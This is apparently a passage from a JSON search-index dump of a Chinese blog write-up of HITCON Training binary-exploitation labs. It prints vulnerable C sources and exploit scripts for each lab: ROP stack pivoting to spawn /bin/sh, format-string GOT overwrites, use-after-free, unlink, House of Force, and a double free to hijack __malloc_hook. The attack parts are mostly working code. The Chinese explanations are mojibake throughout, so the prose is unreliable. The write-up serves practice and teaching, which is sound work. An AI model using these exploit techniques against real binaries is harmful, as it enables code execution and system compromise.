ˆæº¢å‡ºçš„ç©ºé—´è¾ƒå°ï¼Œæ”¾ä¸ä¸‹ ROP é“¾ï¼Œå› æ­¤è€ƒè™‘æ ˆè¿ç§»ã€‚ é¦–å…ˆé€šè¿‡ read è¯»å–æ³„éœ² libc çš„ ROP é“¾åˆ° bufï¼Œç„¶å leave_ret è¿ç§»åˆ° bufã€‚ç»§ç»­ read è¯»å– system(\"/bin/sh\") çš„ ROP é“¾åˆ° fubï¼Œç„¶å leave_ret è¿ç§»åˆ° fubã€‚ buf = elf.bss()+0x300 fub = elf.bss()+0x400 leave_ret = 0x8048418 pop3 = 0x8048569 pop_ebx = 0x804836d payload = flat('a'*0x28,buf,elf.plt['read'],leave_ret,0,buf,0x100) sa(':\\n',payload) payload = flat(fub,elf.plt['puts'],pop_ebx,elf.got['puts'],elf.plt['read'],leave_ret,0,fub,0x100) s(payload) puts = u32(r(4)) base,libc,system = leak_libc('puts',puts) binsh = base + libc.dump('str_bin_sh') payload = flat('a'*4,system,'a'*4,binsh) s(payload) ","date":"2020-02-16","objectID":"/hitcon-training/:6:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab7 - crack æºç ï¼š #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003ctime.h\u003e#include \u003cstdlib.h\u003e unsigned int password ; int main(){ setvbuf(stdout,0,2,0); char buf[100]; char input[16]; int fd ; srand(time(NULL)); fd = open(\"/dev/urandom\",0); read(fd,\u0026password,4); printf(\"What your name ?\"); read(0,buf,99); printf(\"Hello ,\"); printf(buf); printf(\"Your password :\"); read(0,input,15); if(atoi(input) != password){ puts(\"Goodbyte\"); }else{ puts(\"Congrt!!\"); system(\"cat /home/crack/flag\"); } } å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè€ƒè™‘åˆ©ç”¨è¯¥æ¼æ´ä¿®æ”¹ password ä¸ºç¡®å®šçš„å€¼ï¼Œç„¶åè¾“å…¥è¯¥å€¼å³å¯ã€‚ def exec_fmt(payload): io = process(binary) io.sendlineafter('?',payload) io.recvuntil('Hello ,') info = io.recvline() io.close() return info auto = FmtStr(exec_fmt) password = 0x804a048 payload = fmtstr_payload(auto.offset,{password:1234}) sla('?',payload) sla(':',1234) ","date":"2020-02-16","objectID":"/hitcon-training/:7:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab8 - craxme æºç ï¼š #include \u003cstdio.h\u003e int magic = 0 ; int main(){ char buf[0x100]; setvbuf(stdout,0,2,0); puts(\"Please crax me !\"); printf(\"Give me magic :\"); read(0,buf,0x100); printf(buf); if(magic == 0xda){ system(\"cat /home/craxme/flag\"); }else if(magic == 0xfaceb00c){ system(\"cat /home/craxme/craxflag\"); }else{ puts(\"You need be a phd\"); } } åŒæ ·æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå­˜åœ¨ä¸¤ç§åˆ©ç”¨æ–¹æ³•ã€‚ä¸€ç§æ˜¯ç›´æ¥è¦†ç›– magic æ»¡è¶³æ¡ä»¶ï¼š def exec_fmt(payload): io = process(binary) io.sendlineafter(':',payload) info = io.recvline() io.close() return info auto = FmtStr(exec_fmt) magic = 0x804a038 payload = fmtstr_payload(auto.offset,{magic:0xda}) sla(':',payload) å¦ä¸€ç§æ˜¯ç”¨ main ä¸­çš„ read å¼€å§‹çš„è¯­å¥è¦†ç›– putsï¼Œç„¶åç”¨ system è¦†ç›– printf æ¥æ‹¿åˆ° shellã€‚ main_read = 0x804859b payload = fmtstr_payload(auto.offset,{elf.got['puts']:main_read,elf.got['printf']:elf.plt['system']}) sla(':',payload) sl('/bin/sh') ","date":"2020-02-16","objectID":"/hitcon-training/:8:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab9 - playfmt æºç ï¼š #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003cstring.h\u003e char buf[200] ; void do_fmt(){ while(1){ read(0,buf,200); if(!strncmp(buf,\"quit\",4)) break; printf(buf); } return ; } void play(){ puts(\"=====================\"); puts(\" Magic echo Server\"); puts(\"=====================\"); do_fmt(); return; } int main(){ setvbuf(stdout,0,2,0); play(); return; } æœ¬é¢˜ä¾ç„¶æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†é—®é¢˜åœ¨äºè¿™æ¬¡å¹¶ä¸ä¼šå°†æ•°æ®è¯»å…¥æ ˆä¸Šï¼Œè€Œæ˜¯è¯»å…¥ bss æ®µã€‚è¿™ä½¿å¾—å¸¸è§„ fsb åˆ©ç”¨æ–¹å¼å¤±æ•ˆï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡ä¿®æ”¹ saved ebp æ¥è¾¾åˆ°ä»»æ„åœ°å€è¯»å†™ã€‚ åœ¨ printf å‰æŸ¥çœ‹æ ˆæƒ…å†µï¼š 00:0000â”‚ esp 0xffffcd60 â€”â–¸ 0x804a060 (buf) â—‚â€” 'aaaa\\n' 01:0004â”‚ 0xffffcd64 â€”â–¸ 0x8048640 â—‚â€” jno 0x80486b7 /* 'quit' */ 02:0008â”‚ 0xffffcd68 â—‚â€” 0x4 03:000câ”‚ 0xffffcd6c â€”â–¸ 0x804857c (play+51) â—‚â€” add esp, 0x10 04:0010â”‚ 0xffffcd70 â€”â–¸ 0x8048645 â—‚â€” cmp eax, 0x3d3d3d3d 05:0014â”‚ 0xffffcd74 â€”â–¸ 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b1db0 06:0018â”‚ ebp 0xffffcd78 â€”â–¸ 0xffffcd88 â€”â–¸ 0xffffcd98 â—‚â€” 0x0 07:001câ”‚ 0xffffcd7c â€”â–¸ 0x8048584 (play+59) â—‚â€” nop 08:0020â”‚ 0xffffcd80 â€”â–¸ 0xf7fb6d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887 09:0024â”‚ 0xffffcd84 â—‚â€” 0x0 0a:0028â”‚ 0xffffcd88 â€”â–¸ 0xffffcd98 â—‚â€” 0x0 0b:002câ”‚ 0xffffcd8c â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop 0c:0030â”‚ 0xffffcd90 â€”â–¸ 0xf7fb63dc (__exit_funcs) â€”â–¸ 0xf7fb71e0 (initial) â—‚â€” 0x0 å¯ä»¥çœ‹åˆ° saved ebp åœ¨ 6$ ä½ç½®ï¼Œå®ƒå®é™…ä¸ŠæŒ‡å‘ä½äº 10$ çš„ 0xffffcd88ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡ %n ä¿®æ”¹ saved ebpï¼Œå®é™…ä¸Šå°±èƒ½ä¿®æ”¹ 10$ çš„ä½ç½®ã€‚ ç„¶è€Œï¼Œ10$ è¿™ä¸ªä½ç½®åŒæ ·å¯ä»¥æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚åŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥ %n ä¿®æ”¹ 10$ æŒ‡å‘çš„åœ°å€ã€‚é™¤äº†ä¿®æ”¹ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥æ³„éœ²ï¼Œé‚£ä¹ˆè‡ªç„¶æƒ³åˆ°æ³„éœ² libc å‡½æ•°çš„ GOT åœ°å€ï¼Œå†è¦†ç›–æˆ system çš„åšæ³•ã€‚ å› æ­¤æ€è·¯å¦‚ä¸‹ï¼Œè®°æ ˆä¸Šåç§»ä¸º 10 çš„åœ°å€ä¸º ebp2ï¼Œåç§»ä¸º 7 å’Œ 11 çš„åœ°å€åˆ†åˆ«ä¸º s7 å’Œ s11ã€‚ é€šè¿‡ ebp ä¿®æ”¹ ebp2 æŒ‡å‘ s7 é€šè¿‡ ebp2 å°† s7 è¦†ç›–ä¸º printf@got é€šè¿‡ ebp ä¿®æ”¹ ebp2 æŒ‡å‘ s11 é€šè¿‡ ebp2 å°† s11 è¦†ç›–ä¸º printf@got+2 é€šè¿‡ %7$s æ³„éœ² s7 å¤„çš„ printf@gotï¼Œä»è€Œæ³„éœ² libc ç”¨ system@plt ä½ 2 å­—èŠ‚è¦†ç›– s7 å¤„çš„ printf@got ç”¨ system@plt é«˜ 2 å­—èŠ‚è¦†ç›– s11 å¤„çš„ printf@got+2 è¾“å…¥ /bin/sh\\x00ï¼Œè°ƒç”¨ printf(\"/bin/sh\") å³ getshell å½“ç„¶ä¹Ÿå¯ä»¥ 4 å­—èŠ‚ç›´æ¥å†™ï¼Œä½†æ˜¯ç”±äºå­—ç¬¦æ•°è¿‡å¤šä¼šå¯¼è‡´é€Ÿåº¦éå¸¸æ…¢ï¼Œä¸æ¨èã€‚æ­¤å¤–ï¼Œéœ€è¦æ³¨æ„å³ä½¿æ˜¯ 2 å­—èŠ‚å†™ä¾ç„¶ä¼šæœ‰å»¶è¿Ÿï¼Œéœ€è¦å¤šæ¬¡ recv() æ¥æ”¶è¿”å›çš„å­—ç¬¦ä¸²ï¼Œç›´åˆ°å‘é€çš„ç‰¹æ®Šå­—ç¬¦ä¸²èƒ½å¤Ÿæ”¶åˆ°ä¸ºæ­¢ï¼Œç®—æ˜¯ fsb åˆ©ç”¨æ—¶çš„ä¸€ä¸ªå°æŠ€å·§ã€‚ hn = lambda addr,offset: '%{}c%{}$hn'.format(addr,offset) def delay(): while True: sl('delay') sleep(0.2) data = r() if data.find('delay') != -1: break for i in range(3): ru('\\n') sl('%6$p') ebp2 = int(ru('\\n'),16) ebp = ebp2-0x10 s7 = ebp2-0xc s11 = ebp2+4 mask = 0xffff printf = elf.got['printf'] sl(hn(s7\u0026mask,6)) sl(hn(printf\u0026mask,10)) delay() sl(hn(s11\u0026mask,6)) sl(hn((printf+2)\u0026mask,10)) delay() sl('aaaa%7$s') ru('aaaa') printf = u32(r(4)) leak('printf',printf) base,libc,system = leak_libc('printf',printf) sl(hn(system\u0026mask,7)+hn((system\u003e\u003e16)-(system\u0026mask),11)) delay() sl('/bin/sh\\x00') ","date":"2020-02-16","objectID":"/hitcon-training/:9:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab10 - hacknote æºç ï¼š #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e struct note { void (*printnote)(); char *content ; }; struct note *notelist[5]; int count = 0; void print_note_content(struct note *this){ puts(this-\u003econtent); } void add_note(){ int i ; char buf[8]; int size ; if(count\u003e 5){ puts(\"Full\"); return ; } for(i = 0 ; i \u003c 5 ; i ++){ if(!notelist[i]){ notelist[i] = (struct note*)malloc(sizeof(struct note)); if(!notelist[i]){ puts(\"Alloca Error\"); exit(-1); } notelist[i]-\u003eprintnote = print_note_content; printf(\"Note size :\"); read(0,buf,8); size = atoi(buf); notelist[i]-\u003econtent = (char *)malloc(size); if(!notelist[i]-\u003econtent){ puts(\"Alloca Error\"); exit(-1); } printf(\"Content :\"); read(0,notelist[i]-\u003econtent,size); puts(\"Success !\"); count++; break; } } } void del_note(){ char buf[4]; int idx ; printf(\"Index :\"); read(0,buf,4); idx = atoi(buf); if(idx \u003c 0 || idx\u003e= count){ puts(\"Out of bound!\"); _exit(0); } if(notelist[idx]){ free(notelist[idx]-\u003econtent); free(notelist[idx]); puts(\"Success\"); } } void print_note(){ char buf[4]; int idx ; printf(\"Index :\"); read(0,buf,4); idx = atoi(buf); if(idx \u003c 0 || idx\u003e= count){ puts(\"Out of bound!\"); _exit(0); } if(notelist[idx]){ notelist[idx]-\u003eprintnote(notelist[idx]); } } void magic(){ system(\"cat /home/hacknote/flag\"); } void menu(){ puts(\"----------------------\"); puts(\" HackNote\"); puts(\"----------------------\"); puts(\" 1. Add note\"); puts(\" 2. Delete note\"); puts(\" 3. Print note\"); puts(\" 4. Exit\"); puts(\"----------------------\"); printf(\"Your choice :\"); }; int main(){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); char buf[4]; while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : add_note(); break ; case 2 : del_note(); break ; case 3 : print_note(); break ; case 4 : exit(0); break ; default : puts(\"Invalid choice\"); break ; } } return 0; } ç»å…¸çš„ uaf åˆ©ç”¨ï¼Œåšæ³•å’Œ ACTF2019-babyheap ä»¥åŠ BJDCTF2019-YDSneedGirlfriend å®Œå…¨ç›¸åŒã€‚ add(0x10) add(0x10) delete(0) delete(1) add(0x8,p32(elf.sym['magic'])) show(0) ","date":"2020-02-16","objectID":"/hitcon-training/:10:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab11 - bamboobox æºç ï¼š #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/types.h\u003e#include \u003csys/stat.h\u003e#include \u003cfcntl.h\u003estruct item{ int size ; char *name ; }; struct item itemlist[100] = {0}; int num ; void hello_message(){ puts(\"There is a box with magic\"); puts(\"what do you want to do in the box\"); } void goodbye_message(){ puts(\"See you next time\"); puts(\"Thanks you\"); } struct box{ void (*hello_message)(); void (*goodbye_message)(); }; void menu(){ puts(\"----------------------------\"); puts(\"Bamboobox Menu\"); puts(\"----------------------------\"); puts(\"1.show the items in the box\"); puts(\"2.add a new item\"); puts(\"3.change the item in the box\"); puts(\"4.remove the item in the box\"); puts(\"5.exit\"); puts(\"----------------------------\"); printf(\"Your choice:\"); } void show_item(){ int i ; if(!num){ puts(\"No item in the box\"); }else{ for(i = 0 ; i \u003c 100; i++){ if(itemlist[i].name){ printf(\"%d : %s\",i,itemlist[i].name); } } puts(\"\"); } } int add_item(){ char sizebuf[8] ; int length ; int i ; int size ; if(num \u003c 100){ printf(\"Please enter the length of item name:\"); read(0,sizebuf,8); length = atoi(sizebuf); if(length == 0){ puts(\"invaild length\"); return 0; } for(i = 0 ; i \u003c 100 ; i++){ if(!itemlist[i].name){ itemlist[i].size = length ; itemlist[i].name = (char*)malloc(length); printf(\"Please enter the name of item:\"); size = read(0,itemlist[i].name,length); itemlist[i].name[size] = '\\x00'; num++; break; } } }else{ puts(\"the box is full\"); } return 0; } void change_item(){ char indexbuf[8] ; char lengthbuf[8]; int length ; int index ; int readsize ; if(!num){ puts(\"No item in the box\"); }else{ printf(\"Please enter the index of item:\"); read(0,indexbuf,8); index = atoi(indexbuf); if(itemlist[index].name){ printf(\"Please enter the length of item name:\"); read(0,lengthbuf,8); length = atoi(lengthbuf); printf(\"Please enter the new name of the item:\"); readsize = read(0,itemlist[index].name,length); *(itemlist[index].name + readsize) = '\\x00'; }else{ puts(\"invaild index\"); } } } void remove_item(){ char indexbuf[8] ; int index ; if(!num){ puts(\"No item in the box\"); }else{ printf(\"Please enter the index of item:\"); read(0,indexbuf,8); index = atoi(indexbuf); if(itemlist[index].name){ free(itemlist[index].name); itemlist[index].name = 0 ; itemlist[index].size = 0 ; puts(\"remove successful!!\"); num-- ; }else{ puts(\"invaild index\"); } } } void magic(){ int fd ; char buffer[100]; fd = open(\"/home/bamboobox/flag\",O_RDONLY); read(fd,buffer,sizeof(buffer)); close(fd); printf(\"%s\",buffer); exit(0); } int main(){ char choicebuf[8]; int choice; struct box *bamboo ; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); bamboo = malloc(sizeof(struct box)); bamboo-\u003ehello_message = hello_message; bamboo-\u003egoodbye_message = goodbye_message ; bamboo-\u003ehello_message(); while(1){ menu(); read(0,choicebuf,8); choice = atoi(choicebuf); switch(choice){ case 1: show_item(); break; case 2: add_item(); break; case 3: change_item(); break; case 4: remove_item(); break; case 5: bamboo-\u003egoodbye_message(); exit(0); break; default: puts(\"invaild choice!!!\"); break; } } return 0 ; } å­˜åœ¨å…¨å±€æ•°ç»„ itemlistï¼Œç¬¬ä¸€ç§åŠæ³•å°±æ˜¯åˆ©ç”¨å®ƒè¿›è¡Œ unlinkï¼ŒåŠ«æŒ atoi åˆ° magicï¼š ptr = 0x6020c8 add(0x80) add(0x80) add(0x80) fd = ptr-0x18 bk = ptr-0x10 payload = flat(0,0x81,fd,bk,'a'*0x60,0x80,0x90) edit(0,len(payload),payload) delete(1) # hijack to magic payload = flat(0,0,0,elf.got['atoi']) edit(0,len(payload),payload) edit(0,0x8,p64(elf.sym['magic'])) sla('choice:','5') æˆ–è€…åŠ«æŒåˆ° system ä¹Ÿå¯ä»¥ï¼š # OR hijack to system payload = flat(0,0,0,elf.got['atoi']) edit(0,len(payload),payload) show() ru('0 :') atoi = uu64(ru('2 :')) system,binsh = ret2libc(atoi,'atoi') edit(0,0x8,p64(system)) sla('choice:','/bin/sh\\x00') ç¬¬äºŒç§åŠæ³•æ˜¯ House of Forceã€‚ç¨‹åºå¼€å¤´å°± malloc äº† 0x10 çš„ box ç”¨æ¥æ”¾ä¸¤ä¸ªå‡½æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªä¼šåœ¨é€€å‡ºæ—¶è°ƒç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦è¦†ç›–ç¬¬äºŒä¸ªå‡½æ•°ä¸º magic å³å¯ã€‚å…ˆé€šè¿‡æº¢å‡ºä¿®æ”¹ top chunk å¤§å°ä¸º - 1ï¼Œç„¶åè®¡ç®— evil_sizeï¼šå‡å»è‡ªèº«å¤§å°ä»¥åŠ box çš„å¤§å°ï¼Œå†å‡å»ä¸€ä¸ªå¤´éƒ¨çš„å¤§å°å³å¯ã€‚è¿™ç§æ–¹æ³•ç®€å•äº†å¾ˆå¤šã€‚ add(0x60) edit(0,0x70,flat('a'*0x60,0,0xffffffffffffffff)) evil_size = -(0x60+0x10) - (0x10+0x10) - 0x10 add(evil_size) add(","date":"2020-02-16","objectID":"/hitcon-training/:11:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab12 - secretgarden æºç ï¼š #include \u003cstdio.h\u003e#include \u003csignal.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e#include \u003csys/types.h\u003e#include \u003csys/stat.h\u003e#include \u003cfcntl.h\u003e#define TIMEOUT 60 struct flower{ int vaild ; char *name ; char color[24] ; }; struct flower* flowerlist[100] ; unsigned int flowercount = 0 ; void menu(){ puts(\"\"); puts(\"â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜†\"); puts(\"â˜† Baby Secret Garden â˜†\"); puts(\"â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜†\"); puts(\"\"); puts(\" 1 . Raise a flower\"); puts(\" 2 . Visit the garden\"); puts(\" 3 . Remove a flower from the garden\"); puts(\" 4 . Clean the garden\"); puts(\" 5 . Leave the garden\"); puts(\"\"); printf(\"Your choice :\"); } int add(){ struct flower *newflower = NULL ; char *buf = NULL ; unsigned size =0; unsigned index ; if(flowercount \u003c 100){ newflower = malloc(sizeof(struct flower)); memset(newflower,0,sizeof(struct flower)); printf(\"Length of the name :\"); if(scanf(\"%u\",\u0026size)== EOF) exit(-1); buf = (char*)malloc(size); if(!buf){ puts(\"Alloca error !!\"); exit(-1); } printf(\"The name of flower :\"); read(0,buf,size); newflower-\u003ename = buf ; printf(\"The color of the flower :\"); scanf(\"%23s\",newflower-\u003ecolor); newflower-\u003evaild = 1 ; for(index = 0 ; index \u003c 100 ; index++){ if(!flowerlist[index]){ flowerlist[index] = newflower ; break ; } } flowercount++ ; puts(\"Successful !\"); }else{ puts(\"The garden is overflow\"); } } int del(){ unsigned int index ; if(!flowercount){ puts(\"No flower in the garden\"); }else{ printf(\"Which flower do you want to remove from the garden:\"); scanf(\"%d\",\u0026index); if(index \u003c 0 ||index\u003e= 100 || !flowerlist[index]){ puts(\"Invalid choice\"); return 0 ; } (flowerlist[index])-\u003evaild = 0 ; free((flowerlist[index])-\u003ename); puts(\"Successful\"); } } void magic(){ int fd ; char buffer[100]; fd = open(\"/home/babysecretgarden/flag\",O_RDONLY); read(fd,buffer,sizeof(buffer)); close(fd); printf(\"%s\",buffer); exit(0); } void clean(){ unsigned index ; for(index = 0 ; index \u003c 100 ; index++){ if(flowerlist[index] \u0026\u0026 (flowerlist[index])-\u003evaild == 0){ free(flowerlist[index]); flowerlist[index] = NULL; flowercount--; } } puts(\"Done!\"); } int visit(){ unsigned index ; if(!flowercount){ puts(\"No flower in the garden !\"); }else{ for(index = 0 ; index \u003c 100 ; index++){ if(flowerlist[index] \u0026\u0026 (flowerlist[index])-\u003evaild){ printf(\"Name of the flower[%u] :%s\\n\",index,(flowerlist[index])-\u003ename); printf(\"Color of the flower[%u] :%s\\n\",index,(flowerlist[index])-\u003ecolor); } } } } void handler(int signum){ puts(\"timeout\"); exit(1); } void init(){ int fd; fd = open(\"/dev/urandom\",0); close(fd); setvbuf(stdout,0,2,0); signal(SIGALRM,handler); alarm(TIMEOUT); } int main(){ init(); int choice ; char buf[10]; while(1){ menu(); read(0,buf,8); choice = atoi(buf); switch(choice){ case 1: add(); break ; case 2: visit(); break ; case 3: del(); break ; case 4: clean(); break ; case 5: puts(\"See you next time.\"); exit(0); default : puts(\"Invalid choice\"); break ; } } } åœ¨åˆ é™¤æ—¶å­˜åœ¨ double freeï¼Œåˆ©ç”¨æ¼æ´ä¿®æ”¹ puts@got ä¸º magic å³å¯ã€‚ add(0x50) # 0 add(0x50) # 1 free(0) free(1) free(0) fake = 0x601ffa add(0x50,p64(fake)) add(0x50) add(0x50) add(0x50,flat('a'*6,0,elf.sym['magic'],elf.sym['magic'])) å¦ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥ getshellã€‚å…ˆé€šè¿‡ unsorted bin æ³„éœ² libcï¼Œç„¶åç”¨åŒæ ·çš„æ–¹æ³•ä¿®æ”¹ __malloc_hook ä¸º one_gadgetï¼Œæœ€åè§¦å‘ double free æ£€æµ‹è°ƒç”¨ malloc_printerrï¼Œä»è€Œè°ƒç”¨ __malloc_hookã€‚ add(0x80) add(0x68) add(0x68) free(0) clean() add(0x80) show() ru('a'*8) base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10 leak('base',base) malloc_hook = base+libc.sym['__malloc_hook'] free(1) free(2) free(1) add(0x68,p64(malloc_hook-0x23)) add(0x68) add(0x68) add(0x68,'a'*0x13+p64(base+one[2])) free(1) free(1) ","date":"2020-02-16","objectID":"/hitcon-training/:12:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab13 - heapcreator æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret \u003c=0){ puts(\"Error\"); _exit(-1); } } struct heap { size_t size ; char *content ; }; struct heap *heaparray[10]; void menu(){ puts(\"--------------------------------\"); puts(\" Heap Creator\"); puts(\"--------------------------------\"); puts(\" 1. Create a Heap\"); puts(\" 2. Edit a Heap\"); puts(\" 3. Show a Heap\"); puts(\" 4. Delete a Heap\"); puts(\" 5. Exit\"); puts(\"--------------------------------\"); printf(\"Your choice :\"); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i \u003c 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(\"Allocate Error\"); exit(1); } printf(\"Size of Heap :\"); read(0,buf,8); size = atoi(buf); heaparray[i]-\u003econtent = (char *)malloc(size); if(!heaparray[i]-\u003econtent){ puts(\"Allocate Error\"); exit(2); } heaparray[i]-\u003esize = size ; printf(\"Content of heap:\"); read_input(heaparray[i]-\u003econtent,size); puts(\"SuccessFul\"); break ; } } } void edit_heap(){ int idx ; char buf[4]; printf(\"Index :\"); read(0,buf,4); idx = atoi(buf); if(idx \u003c 0 || idx\u003e= 10){ puts(\"Out of bound!\"); _exit(0); } if(heaparray[idx]){ printf(\"Content of heap :\"); read_input(heaparray[idx]-\u003econtent,heaparray[idx]-\u003esize+1); puts(\"Done !\"); }else{ puts(\"No such heap !\"); } } void show_heap(){ int idx ; char buf[4]; printf(\"Index :\"); read(0,buf,4); idx = atoi(buf); if(idx \u003c 0 || idx\u003e= 10){ puts(\"Out of bound!\"); _exit(0); } if(heaparray[idx]){ printf(\"Size : %ld\\nContent : %s\\n\",heaparray[idx]-\u003esize,heaparray[idx]-\u003econtent); puts(\"Done !\"); }else{ puts(\"No such heap !\"); } } void delete_heap(){ int idx ; char buf[4]; printf(\"Index :\"); read(0,buf,4); idx = atoi(buf); if(idx \u003c 0 || idx\u003e= 10){ puts(\"Out of bound!\"); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-\u003econtent); free(heaparray[idx]); heaparray[idx] = NULL ; puts(\"Done !\"); }else{ puts(\"No such heap !\"); } } int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(\"Invalid Choice\"); break; } } return 0 ; } æœ¬é¢˜æ·»åŠ å †æ—¶æ²¡æœ‰æ£€æŸ¥ sizeï¼Œå¯ä»¥æ•´æ•°æº¢å‡ºï¼›ç¼–è¾‘å †æ—¶å­˜åœ¨äººä¸ºè®¾ç½®çš„ off by oneï¼Œå› æ­¤å¯ä»¥è¦†ç›–ä¸‹ä¸€ä¸ª chunk çš„ chunk_size é€ æˆå †å—é‡å ã€‚æˆ‘ä»¬å…ˆç”³è¯· 0x18 çš„ chunkï¼Œéœ€è¦æ³¨æ„å¿…é¡»ä»¥ 8 ç»“å°¾ä»¥è¦†ç›–åˆ° chunk_sizeï¼Œç„¶åç”³è¯· 0x10 çš„ victimï¼Œåˆ©ç”¨ off by one ä¿®æ”¹ victim çš„ chunk_size ä¸º 0x41 åï¼Œé‡Šæ”¾ victimã€‚ æˆ‘ä»¬çŸ¥é“ï¼ŒåŸæ¥çš„ victim æŒ‡é’ˆæ˜¯ 0x20 çš„ chunkï¼Œvictim çš„å†…å®¹ä¹Ÿæ˜¯ 0x20 çš„ chunkã€‚ç°åœ¨ victim æŒ‡é’ˆå˜æˆäº† 0x40ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”³è¯· 0x30 çš„ chunkï¼Œä½¿å¾—æ–° chunk å†…å®¹ä½¿ç”¨çš„æ˜¯ victim çš„æŒ‡é’ˆ chunkï¼Œè€Œæ–° chunk çš„æŒ‡é’ˆä½¿ç”¨çš„æ˜¯ victim çš„å†…å®¹ chunkã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½æ§åˆ¶æ•´ä¸ª victim äº†ã€‚ç¡®ä¿æŒ‡é’ˆå†…çš„ heapsize åˆæ³•ï¼Œç„¶ååœ¨ content å¯¹åº”ä½ç½®æ”¾ä¸Šè¦æ³„éœ² / è¦†ç›–çš„å‡½æ•° GOTï¼Œé€šè¿‡ libc æ³„éœ²å¾—åˆ° systemï¼Œæœ€åç”¨ system åŠ«æŒ GOT å³å¯ã€‚ add(0x18) # 0 add(0x10) # 1 edit(0,'a'*0x18+'\\x41') delete(1) # new heap-\u003econtent = heap1-\u003eptr # new heap-\u003eptr = heap1-\u003econtent add(0x30,flat(0,0,0,0,0x30,elf.got['atoi'])) show(1) ru('Content :') atoi = uu64(r(6)) system,binsh = ret2libc(atoi,'atoi') edit(1,p64(system)) sla('choice :','sh\\x00\\x00') ","date":"2020-02-16","objectID":"/hitcon-training/:13:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab14 - magicheap æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret \u003c=0){ puts(\"Error\"); _exit(-1); } } char *heaparray[10]; unsigned long int magic = 0 ; void menu(){ puts(\"--------------------------------\"); puts(\" Magic Heap Creator\"); puts(\"--------------------------------\"); puts(\" 1. Create a Heap\"); puts(\" 2. Edit a Heap\"); puts(\" 3. Delete a Heap\"); puts(\" 4. Exit\"); puts(\"--------------------------------\"); printf(\"Your choice :\"); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i \u003c 10 ; i++){ if(!heaparray[i]){ printf(\"Size of Heap :\"); read(0,buf,8); size = atoi(buf); heaparray[i] = (char *)malloc(size); if(!heaparray[i]){ puts(\"Allocate Error\"); exit(2); } printf(\"Content of 